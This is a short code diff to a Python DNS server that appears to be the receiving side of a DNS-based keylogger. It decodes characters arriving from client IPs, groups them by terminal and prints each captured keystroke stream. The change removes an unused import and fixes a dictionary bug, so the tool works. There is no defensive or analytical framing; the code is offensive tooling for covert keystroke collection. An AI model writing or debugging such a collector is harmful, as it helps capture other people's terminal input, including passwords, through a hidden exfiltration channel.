@@ -3,7 +3,6 @@ import os
 import socket
 import time
 
-import yaml
 from dnslib import QTYPE, RCODE, DNSRecord
 from dnslib.server import BaseResolver, DNSHandler, DNSLogger, DNSServer
 
@@ -57,13 +56,14 @@ class PassthroughDNSHandler(DNSHandler):
                 keys[client_ip][tty].append(chr(key))
 
             res = {}
-            for client_ip, tty_obj in keys.items():
-                for tty_id, k in tty_obj.items():
+            for client_ip, tty_objs in keys.items():
+                res[client_ip] = {}
+                for tty_id, k in tty_objs.items():
                     res[client_ip][tty_id] = "".join(k)
             os.system("clear")
-            for ip, tty_obj in res.items():
+            for ip, tty_objs in res.items():
                 print(f"[{ip}]")
-                for tty_id, k in tty_obj.items():
+                for tty_id, k in tty_objs.items():
                     print(f"(tty_{tty_id}): {k}")
 
         except Exception as e:
